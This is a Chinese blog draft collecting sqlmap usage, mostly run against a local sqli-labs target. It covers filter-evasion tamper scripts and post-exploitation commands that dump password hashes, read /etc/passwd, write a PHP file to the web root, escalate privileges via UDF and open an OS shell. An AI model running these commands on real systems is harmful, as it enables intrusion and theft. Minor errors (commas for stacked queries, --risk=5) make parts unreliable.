---
title: "sqlmap基础命令的摘录"
date: 2024-12-02T21:49:06+08:00
summary: "sqlmap基础命令的摘录"
url: "/posts/sqlmap基础命令的摘录/"
categories:
  - "sqlmap"
tags:
  - "sqlmap基础命令"
draft: true
---

# 0x01前言

之前看到一个师傅的文章写了很多sqlmap的指令，然后觉得挺全面的想收集一下，所以发个文章去做记录，但是后面找不到借鉴的师傅的文章了，后面找到了这里再放引用

# 0x02正文

## 关于sqlmap

sqlmap 是一款开源的自动化 SQL 注入测试及漏洞利用工具

sqlmap它支持5种SQL注入技术：

- 布尔盲注，页面无回显时，利用返回页面判断来判断查询语句正确与否
- 时间盲注，页面无回显时，利用时间延迟语句是否已经执行来判断查询语句正确与否
- 报错注入，即利用报错信息进行注入
- 联合注入，即Union联合注入
- 堆叠注入，即在允许同时执行多条语句时，利用逗号同时执行多条语句的注入

### 1.基础命令

```plain
-u  "url"		#检测注入点
--dbs			#列出所有数据库的名称
--current-db	        #列出当前数据库的名称
-D			#指定一个数据库
--table			#列出所有表名
-T			#指定表名
--columns		#列出所有字段名
-C			#指定字段
-dump			#列出字段内容
```

#### GET注入指定 url 作为目标输入

```python
python sqlmap.py -u "url"
```

#### POST注入将请求包保存为request.txt进行注入

```python
sqlmap -r request.txt -p id --dump
or
sqlmap -r request.txt --data='id=1' --dump
```

#### –sql-shell:运行自定义SQL语句

#### –os-cmd, –os-shell:运行任意操作系统命令

当为MySQL数据库时，需满足下面条件：

- 当前用户为 root
- 知道网站根目录的绝对路径

```python
sqlmap -u "url"  --refer=ctf.show --os-shell 
```

#### –file-read:从数据库服务器中读取文件

```python
sqlmap -u "url" --file-read "c:/test.txt"
```

sqlmap还有有探测等级和危险等级(—level —risk)的设置：
sqlmap一共有5个探测等级，默认是1。等级越高，说明探测时使用的payload也越多。其中5级的payload最多，会自动破解出cookie、XFF等头部注入。当然，等级越高，探测的时间也越慢。这个参数会影响测试的注入点，GET和POST的数据都会进行测试，HTTP cookie在level为2时就会测试，HTTP User-Agent/Referer头在level为3时就会测试。在不确定哪个参数为注入点时，为了保证准确性，建议设置level为5。

sqlmap一共有3个危险等级，也就是说你认为这个网站存在几级的危险等级。和探测等级一个意思，在不确定的情况下，建议设置为3级

比如：

```plain
sqlmap -u "url" --level=5 --risk=3
```

### 2. 关于tamper

使用 `python sqlmap.py --list-tampers` 可以查看每一个 tamper 的具体作用以及它们所支持的数据库类型

使用 `python sqlmap.py --tamper=<tamper-name>` 可以指定注入时使用的 tamper，多个 tamper 可通过逗号分隔。

##### 1、apostrophemask.py 

适用数据库：ALL

 作用：将引号替换为utf-8，用于过滤单引号 

使用脚本前：tamper("1 AND '1'='1") 

使用脚本后：1 AND %EF%BC%871%EF%BC%87=%EF%BC%871



##### 2、base64encode.py 

适用数据库：ALL 

作用：替换base64编码 

使用脚本前：tamper("1' AND SLEEP(5)#") 

使用脚本后：MScgQU5EIFNMRUVQKDUpIw== 



##### 3、multiplespaces.py

 适用数据库：ALL 

作用：围绕sql关键字添加多个空格 

使用脚本前：tamper('1 UNION SELECT foobar') 

使用脚本后：1 UNION SELECT foobar 



##### 4、space2plus.py 

适用数据库：ALL 

作用:用加号替换空格 

使用脚本前：tamper('SELECT id FROM users') 

使用脚本后：SELECT+id+FROM+users 



##### 5、space2randomblank.py 

适用数据库：ALL 

作用：将空格替换为其他随机有效字符 

使用脚本前：tamper('SELECT id FROM users') 

使用脚本后：SELECT%0Did%0CFROM%0Ausers


##### 6、unionalltounion.py 

适用数据库：ALL 

作用：将union all select 替换为union select 

使用脚本前：tamper('-1 UNION ALL SELECT')

 使用脚本后：-1 UNION SELECT 



##### 7、space2dash.py 

适用数据库：ALL 

作用：将空格替换为破折号（--），并添加一个随机字符和换行符（\n） 

使用脚本前：tamper('1 AND 9227=9227') 

适用脚本后：1--upgPydUzKpMX%0AAND--RcDKhIr%0A9227=9227



#####  8、space2mssqlblank.py

 适用数据库：mssql 

测试数据库版本：Microsoft SQL Server 2000 、Microsoft SQL Server 2005

 作用：将空格替换为有效字符集的随机空白字符('%01', '%02', '%03', '%04', '%05', '%06', '%07', '%08', '%09', '%0B', '%0C', '%0D', '%0E', '%0F', '%0A') 

使用脚本前：tamper('SELECT id FROM users') 

适用脚本后：SELECT%0Did%0DFROM%04users 



##### 9、between.py 

测试数据库：Microsoft SQL Server 2005 、MySQL 4, 5.0 and 5.5、 Oracle 10g、 PostgreSQL 8.3, 8.4, 9.0 

作用：将">"替换为"NOT BETWEEN 0 AND #"，将"="替换为"BETWEEN # AND #" 

使用脚本前：tamper('1 AND A > B--')，tamper('1 AND A = B--') 

使用脚本后：1 AND A NOT BETWEEN 0 AND B--，1 AND A BETWEEN B AND B--



##### 10、percentage.py

 适用数据库：ASP 

测试数据库：Microsoft SQL Server 2000, 2005 、MySQL 5.1.56, 5.5.11 、PostgreSQL 9.0 

作用：在每个字符前加上一个% 

使用脚本前：tamper('SELECT FIELD FROM TABLE') 

使用脚本后：%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E 





##### 11、sp_password.py 

适用数据库：mssql 

作用：将sp_password追加到有效载荷后，以便从DBMS日志中自动混淆。 

使用脚本前：tamper('1 AND 9227=9227-- ') 

使用脚本后：1 AND 9227=9227-- sp_password



#####  12、charencode.py 

测试数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0 

作用：对指定的payload全部使用url编码（不处理已进行编码的字符） 

使用脚本前：tamper('SELECT FIELD FROM%20TABLE') 

使用脚本后：%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45 



##### 13、randomcase.py 

测试数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0、SQLite 3 作用：将字符替换为随机大小写 

使用脚本前：tamper('INSERT') 

使用脚本后：InSeRt 



##### 14、charunicodeencode.py 

适用数据库：ASP 、ASP.NET 测试数据库：Microsoft SQL Server 2000 、Microsoft SQL Server 2005、MySQL 5.1.56 、PostgreSQL 9.0.3 

作用：适用字符串的Unicode编码

 使用脚本前：tamper('SELECT FIELD%20FROM TABLE') 

使用脚本后：%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045



#####  15、space2comment.py 

测试数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0

 作用：将空格替换为/**/ 

使用脚本前：tamper('SELECT id FROM users') 

使用脚本后：SELECT/**/id/**/FROM/**/users

#### 使用 sqlmap 自带爬虫爬取目标页面

```bash
$ python sqlmap.py -u "http://baidu.com/" --crawl=1
```

1. 使用 sqlmap 自带的表单解析功能获取目标表单

```bash
$ python sqlmap.py -u "http://baidu.com/" --forms
```

1. 使用 sqlmap 扫描配置文件作为目标

```bash
$ python sqlmap.py -c sqlmap-scan.ini
```

### 3.请求相关

#### 1. 设置请求时的 UA

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -A 'Test-Java-Agent'
```

#### 2. 设置请求时的 Header

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -H 'X-Forwarded-For: 127.0.0.1'
```

#### 3. 设置请求时的方法（适用于 `-u`、`-m` 等无法将完整数据包传入的场景）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1"  --method='POST'
```

#### 4. 设置请求时传递的数据（适用于 `-u`、`-m` 等无法将完整数据包传入的场景）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/login" --data='username=123&password=xxoo'
```

#### 5. 设置请求时默认的参数间隔符（默认是 `&`）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1;qq=2" --param-del=';'
```

#### 6. 设置请求时的 cookie

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --cookie='sessionid=xxxx'
```

#### 7. 设置请求时默认的 cookie 间隔符（默认是`;`）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --cookie='sessionid=xxxx|username=admin' --cookie-del='|'
```

#### 8. 指定存放了存活 cookie 的文件（在每一次请求时都会访问此文件获取 cookie）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --live-cookies='/tmp/live-cookies'
```

#### 9. 忽略 response 中的 set-cookie

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --drop-set-cookie
```

#### 10. 使用随机 UA

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --random-agent
```

#### 11. 指定请求时的 Host

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --host='127.0.0.1'
```

#### 12. 指定请求时的 Referer

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --referer='http://127.0.0.1/'
```

#### 13. 指定多个请求时的 Header

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --headers="Accept-Language: fr\nETag: 123"
```

#### 14. 指定请求时的 auth 方式（当请求存在 auth 时使用）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --auth-type='Basic'
```

#### 15. 指定进行认证时使用的认证信息

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --auth-cred='admin:123456'
```

#### 16. 指定认证时使用的证书或私钥

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --auth-file='private-key'
```

#### 17. 忽略无效的 response status code

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --ignore-code=404
```

#### 18. 忽略系统代理

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --ignore-proxy
```

#### 19. 忽略 response 中的跳转（似乎存在问题）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --ignore-redirects
```

#### 20. 忽略请求超时

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --ignore-timeouts
```

#### 21. 设置请求所使用的代理

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --proxy='http://127.0.0.1:8080'
```

#### 22. 设置请求所使用代理的账号密码

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --proxy='http://127.0.0.1:8080' --proxy-cred='admin:123456'
```

#### 23. 设置存放了代理的文本

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --proxy-file='/tmp/proxies'
```

#### 24. 设置每个请求之间的间隔时间（秒）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --delay=5
```

#### 25. 设置请求超时时间

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --timeout=2
```

#### 26. 设置请求最大重试次数

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --retries=3
```

#### 27. 设置重试匹配正则（当页面内容匹配上时重新请求）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --retry-on='</font>'
```

#### 28. 设置不对 payload 进行 urlencode

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --skip-urlencode
```

#### 29. 设置使用分块传输数据

```bash
$ python sqlmap.py -r req.txt --chunked
```

#### 30. 设置使用参数污染分离 payload

（这里的 payload 有点奇怪，不是每个后端都能解析的，建议使用时通过 `-v 4` 自行观察 payload）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -hpp
```

#### 31. 设置请求线程数

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --threads=3
```

### 4.注入相关

#### 1. 设置需要注入的参数

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -p id
```

#### 2. 设置需要跳过注入的参数

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1&timestamp=1111" --skip=timestamp
```

#### 3. 设置注入时跳过静态参数的测试

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --skip-static
```

#### 4. 设置需要跳过注入的参数（ 与`--skip` 的不同之处在于此处为正则匹配而非字符串相等的判断）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1&sessionId=123" --param-exclude='sess'
```

#### 5. 设置需要测试的数据库类型（当预先知道目标数据库时可使用此参数减少发包量）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --dbms='mysql'
```

#### 6. 设置关闭 cast 函数的使用（某些 MYSQL 版本需要使用）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --no-cast
```

#### 7. 设置关闭 char 函数的使用（减少 payload 长度）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --no-escape
```

#### 8. 设置启用 hex 编码（避免因编码原因导致注入时的数据丢失）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --hex
```

#### 9. 使用 tamper 修改 payload

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --tamper='uppercase'
```

#### 10. 设置注入请求级别（级别越高请求量越大）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --level=3
```

#### 11. 设置注入威胁级别（级别越高风险越大，会使用一些带 OR 的测试语句）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --risk=5
```

#### 12. 设置页面匹配的方式

##### a. 设置匹配响应的字符串（当页面存在这个值时为真，用于布尔注入）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --string='You are'
```

##### b. 设置匹配响应的正则（当页面被这个正则匹配到时为真，用于布尔注入）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --regexp='You are [a-z]{1,5}'
```

##### c. 设置不匹配响应的字符串（当页面存在这个值时为假，用于布尔注入）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --not-string='Failed'
```

#### 13. 设置使用状态码判断页面真假（当响应为此状态码时为真，优先级低于页面匹配）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --code=200
```

#### 14. 设置仅当启发式注入返回真时才继续接下来的注入测试

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --smart
```

#### 15. 设置要使用的注入测试技术（BEUSTQ，每个字母代表一种注入方式，B 代表 Boolean、T 代表 Time）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --technique=B
```

#### 16. 设置延迟注入默认的延迟时间

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --time-sec=2
```

#### 17. 设置二次注入的页面

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-new/first.php?referer=x" --second-url "http://localhost:8887/less-new/second.php"
```

### 5.通用功能

#### 1. 设置将所有 SQLMAP 发出的测试请求信息存储至文本中

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -t sqlmap-request.log
```

#### 2. 设置 SQLMAP 的默认答案

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --answers="quit=N,follow=N"
```

#### 3. 设置后续不再询问用户输入而是直接使用默认选项

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --batch
```

#### 4. 设置在进行注入测试前先检查自身网络环境

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --check-internet
```

#### 5. 设置爬虫模式下不爬取某些链接（比如不爬取退出链接）

```bash
$ python sqlmap.py -u "http://baidu.com/" --crawl=1 --crawl-exclude='logout'
```

#### 6. 设置输出格式（CSV、HTML、SQLITE）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --dump-format='CSV'
```

#### 7. 设置将所有 SQLMAP 发出的测试请求信息存储至 HAR 文件中

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --har=sqlmap-request.har
```

#### 8. 设置默认的输出路径

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --output-dir='/tmp'
```

#### 9. 设置跳过启发性注入测试

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --skip-heuristics
```

#### 10. 设置跳过 WAF 探测

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --skip-waf
```

#### 11. 设置 target web 的绝对路径

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --web-root='/var/www/html'
```

#### 12. 将本次扫描的配置存储到文件中（后续可直接加载此文件进行注入测试）

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --save='sqlmap-scan.ini'
```

### 6. 注入利用

#### 1. 读取目标数据库具体版本

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --banner
```

#### 2. 读取当前用户以及当前数据库

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --current-db --current-user
```

#### 3. 读取所有数据库

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --dbs
```

#### 4. 读取某个数据库的所有表

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -D db_name --tables
```

#### 5. 读取某个表的所有列

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -D db_name -T table_name --columns
```

#### 6. 读取某个列的所有数据

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -D db_name -T table_name -C col_name --dump
```

#### 7. 读取某个表的数据量

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" -D db_name -T table_name --count
```

#### 8. 读取数据库的所有用户

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --users
```

#### 9. 读取数据库内所有用户的密码信息

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --passwords
```

#### 10. 读取目标主机名

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --hostname
```

#### 11. 搜寻数据库、表、列

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --search -T user
```

#### 12. 读取目标系统中的文件

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --file-read='/etc/passwd'
```

#### 13. 写入文件到目标系统中

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --file-write "/tmp/local-file.php" --file-dest "/var/www/html/remote-file.php"
```

#### 14. UDF提权

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --udf-inject --shared-lib='/tmp/xxx.dll'
```

#### 15. 执行系统命令

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --os-cmd='id'
```

#### 16. 获取目标 shell

1. 获取系统 shell

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --os-shell
```

#### 17. 获取 sql shell

```bash
$ python sqlmap.py -u "http://127.0.0.1:8887/Less-1/Less-1?id=1" --sql-shell
```

#### 18. 操作 Windows 注册表

```bash
--reg-read          设置后续将读取 windows 注册表
--reg-add           添加 key:value 到 windows 注册表
--reg-del           删除 key:value 到 windows 注册表
--reg-key=REGKEY    指定要操作的 windows 注册表 key
--reg-value=REGVAL  指定要操作的 windows 注册表 value
--reg-data=REGDATA  设置 value 对应的 data
--reg-type=REGTYPE  设置 data 对应的 type（如DWORD）
```
